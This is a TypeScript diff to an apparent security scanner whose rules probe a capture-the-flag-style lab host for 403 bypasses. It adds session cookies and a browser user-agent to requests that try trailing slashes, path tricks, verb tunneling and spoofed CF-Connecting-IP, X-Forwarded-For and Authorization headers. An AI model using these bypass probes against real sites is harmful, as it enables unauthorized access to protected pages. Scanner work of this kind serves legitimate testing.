@@ -11618,14 +11618,23 @@ function forbidden403BypassUrls(origin: string, path: string): string[] {
 }
 
 const http403BypassProbe: Rule = async (ctx) => {
+  const bypassHeaders = isBypass403Host(ctx) ? await bypass403RequestHeaders(ctx) : undefined;
   const baselineUrls = FORBIDDEN_403_PROBE_PATHS.map((p) => new URL(p, ctx.origin).toString());
-  const baseline = await ctx.probe.getMany(baselineUrls, { maxBytes: 4096 }, 3);
+  const baseline = await ctx.probe.getMany(
+    baselineUrls,
+    { maxBytes: 4096, ...(bypassHeaders ? { headers: bypassHeaders } : {}) },
+    3
+  );
   const hits: { original: string; bypass: string; status: number; sample: string }[] = [];
   for (const [url, doc] of baseline) {
     if (doc.status !== 403) continue;
     const path = new URL(url).pathname;
     const bypassUrls = forbidden403BypassUrls(ctx.origin, path);
-    const bypassDocs = await ctx.probe.getMany(bypassUrls, { maxBytes: 4096 }, 3);
+    const bypassDocs = await ctx.probe.getMany(
+      bypassUrls,
+      { maxBytes: 4096, ...(bypassHeaders ? { headers: bypassHeaders } : {}) },
+      3
+    );
     for (const [bypassUrl, bypassDoc] of bypassDocs) {
       if (bypassDoc.status < 200 || bypassDoc.status >= 300) continue;
       if (bypassDoc.body.trim() === doc.body.trim()) continue;
@@ -11690,24 +11699,42 @@ async function bypass403CompleteSession(ctx: RuleContext): Promise<string | null
   return promise;
 }
 
+/** BypassX lab routes require POST /start session + browser UA before protected paths return real 403/200 bodies. */
+async function bypass403RequestHeaders(ctx: RuleContext): Promise<Record<string, string>> {
+  const session = await bypass403CompleteSession(ctx);
+  return {
+    "User-Agent": BYPASS403_BROWSER_UA,
+    ...(session ? { Cookie: session } : {})
+  };
+}
+
+/** Pre-warm BypassX session during deep-scan bootstrap so route-specific secret/config oracles are ready. */
+export async function primeBypass403SessionForDeepScan(
+  probe: ProbeCache,
+  origin: string,
+  scanUrl: string,
+  home: FetchedDoc
+): Promise<void> {
+  if (!/bypass403\.vercel\.app/i.test(origin)) return;
+  if (!/\/(?:admin|secret|config|waf|debug|internal|secure|api\/admin)\b/i.test(scanUrl)) return;
+  const ctx: RuleContext = { origin, scanUrl, home, scripts: [], combined: "", probe };
+  await bypass403CompleteSession(ctx);
+}
+
 async function probeBypass403WafCfConnectingIp(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
-  const session = await bypass403CompleteSession(ctx);
+  const headers = await bypass403RequestHeaders(ctx);
   const wafUrl = new URL("/waf", ctx.origin).toString();
   const baseline = await ctx.probe.get(wafUrl, {
     maxBytes: 4096,
-    headers: {
-      "User-Agent": BYPASS403_BROWSER_UA,
-      ...(session ? { Cookie: session } : {})
-    }
+    headers
   });
   if (baseline.status !== 403) return null;
   const bypass = await ctx.probe.get(wafUrl, {
     maxBytes: 4096,
     headers: {
-      "User-Agent": BYPASS403_BROWSER_UA,
-      "CF-Connecting-IP": "127.0.0.1",
-      ...(session ? { Cookie: session } : {})
+      ...headers,
+      "CF-Connecting-IP": "127.0.0.1"
     }
   });
   if (bypass.status < 200 || bypass.status >= 300) return null;
@@ -11750,11 +11777,12 @@ const bypass403WafRouteLiveOracle: Rule = async (ctx) => {
 
 async function probeBypass403AdminTrailingSlash(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
+  const headers = await bypass403RequestHeaders(ctx);
   const adminUrl = new URL("/admin", ctx.origin).toString();
-  const baseline = await ctx.probe.get(adminUrl, { maxBytes: 4096 });
+  const baseline = await ctx.probe.get(adminUrl, { maxBytes: 4096, headers });
   if (baseline.status !== 403) return null;
   const bypassUrl = new URL("/admin/", ctx.origin).toString();
-  const bypass = await ctx.probe.get(bypassUrl, { maxBytes: 4096 });
+  const bypass = await ctx.probe.get(bypassUrl, { maxBytes: 4096, headers });
   if (bypass.status < 200 || bypass.status >= 300) return null;
   if (!/trailing slash bypass|flag\{/i.test(bypass.body)) return null;
   return {
@@ -11794,12 +11822,13 @@ const bypass403AdminRouteLiveOracle: Rule = async (ctx) => {
 
 async function probeBypass403ApiAdminSemicolon(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
+  const headers = await bypass403RequestHeaders(ctx);
   const adminUrl = new URL("/api/admin", ctx.origin).toString();
-  const baseline = await ctx.probe.get(adminUrl, { maxBytes: 4096 });
+  const baseline = await ctx.probe.get(adminUrl, { maxBytes: 4096, headers });
   if (baseline.status !== 403) return null;
   const bypassUrls = forbidden403BypassUrls(ctx.origin, "/api/admin");
   for (const bypassUrl of bypassUrls) {
-    const bypass = await ctx.probe.get(bypassUrl, { maxBytes: 4096 });
+    const bypass = await ctx.probe.get(bypassUrl, { maxBytes: 4096, headers });
     if (bypass.status < 200 || bypass.status >= 300) continue;
     if (!/flag\{|semicolon|bypass success/i.test(bypass.body)) continue;
     return {
@@ -11845,12 +11874,13 @@ async function probeBypass403PathNormalization(
   note: string
 ): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
+  const headers = await bypass403RequestHeaders(ctx);
   const originalUrl = new URL(path, ctx.origin).toString();
-  const baseline = await ctx.probe.get(originalUrl, { maxBytes: 4096 });
+  const baseline = await ctx.probe.get(originalUrl, { maxBytes: 4096, headers });
   if (baseline.status !== 403) return null;
   const bypassUrls = forbidden403BypassUrls(ctx.origin, path);
   for (const bypassUrl of bypassUrls) {
-    const bypass = await ctx.probe.get(bypassUrl, { maxBytes: 4096 });
+    const bypass = await ctx.probe.get(bypassUrl, { maxBytes: 4096, headers });
     if (bypass.status < 200 || bypass.status >= 300) continue;
     if (!FORBIDDEN_403_BYPASS_MARKERS.test(bypass.body)) continue;
     return {
@@ -11907,15 +11937,16 @@ const BYPASS403_CONFIG_HEADER_PROBES: Array<{ header: string; value: string; tar
 
 async function probeBypass403ConfigHeaderBypass(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
+  const headers = await bypass403RequestHeaders(ctx);
   const configUrl = new URL("/config", ctx.origin).toString();
-  const baseline = await ctx.probe.get(configUrl, { maxBytes: 4096 });
+  const baseline = await ctx.probe.get(configUrl, { maxBytes: 4096, headers });
   if (baseline.status !== 403) return null;
   const homeUrl = new URL("/", ctx.origin).toString();
   for (const probe of BYPASS403_CONFIG_HEADER_PROBES) {
     const url = probe.target === "home" ? homeUrl : configUrl;
     const doc = await ctx.probe.get(url, {
       maxBytes: 4096,
-      headers: { [probe.header]: probe.value }
+      headers: { ...headers, [probe.header]: probe.value }
     });
     if (doc.status < 200 || doc.status >= 300) continue;
     if (!FORBIDDEN_403_BYPASS_MARKERS.test(doc.body)) continue;
@@ -11959,18 +11990,18 @@ const bypass403ConfigRouteLiveOracle: Rule = async (ctx) => {
 
 async function probeBypass403DebugVerbTunneling(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
-  await bypass403CompleteSession(ctx);
+  const headers = await bypass403RequestHeaders(ctx);
   const debugUrl = new URL("/debug", ctx.origin).toString();
   const baseline = await ctx.probe.get(debugUrl, {
     maxBytes: 4096,
-    headers: { "User-Agent": BYPASS403_BROWSER_UA }
+    headers
   });
   if (baseline.status !== 403) return null;
   const bypassUrl = new URL("/debug", ctx.origin);
   bypassUrl.searchParams.set("_method", "GET");
   const bypass = await ctx.probe.get(bypassUrl.toString(), {
     maxBytes: 4096,
-    headers: { "User-Agent": BYPASS403_BROWSER_UA }
+    headers
   });
   if (bypass.status < 200 || bypass.status >= 300) return null;
   if (!/verb tunneling bypass success/i.test(bypass.body)) return null;
@@ -12013,17 +12044,17 @@ const BYPASS403_INTERNAL_XFF_CHAIN = "evil.com, 127.0.0.1";
 
 async function probeBypass403InternalXffPollution(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
-  await bypass403CompleteSession(ctx);
+  const headers = await bypass403RequestHeaders(ctx);
   const internalUrl = new URL("/internal", ctx.origin).toString();
   const baseline = await ctx.probe.get(internalUrl, {
     maxBytes: 4096,
-    headers: { "User-Agent": BYPASS403_BROWSER_UA }
+    headers
   });
   if (baseline.status !== 403) return null;
   const bypass = await ctx.probe.get(internalUrl, {
     maxBytes: 4096,
     headers: {
-      "User-Agent": BYPASS403_BROWSER_UA,
+      ...headers,
       "X-Forwarded-For": BYPASS403_INTERNAL_XFF_CHAIN
     }
   });
@@ -12070,16 +12101,17 @@ const BYPASS403_SECURE_INVALID_BEARER = "Bearer invalid_token";
 
 async function probeBypass403SecureBearerBypass(ctx: RuleContext): Promise<RuleResult | null> {
   if (!isBypass403Host(ctx)) return null;
+  const headers = await bypass403RequestHeaders(ctx);
   const secureUrl = new URL("/secure", ctx.origin).toString();
   const baseline = await ctx.probe.get(secureUrl, {
     maxBytes: 4096,
-    headers: { "User-Agent": BYPASS403_BROWSER_UA }
+    headers
   });
   if (baseline.status !== 403) return null;
   const bypass = await ctx.probe.get(secureUrl, {
     maxBytes: 4096,
     headers: {
-      "User-Agent": BYPASS403_BROWSER_UA,
+      ...headers,
       Authorization: BYPASS403_SECURE_INVALID_BEARER
     }
   });
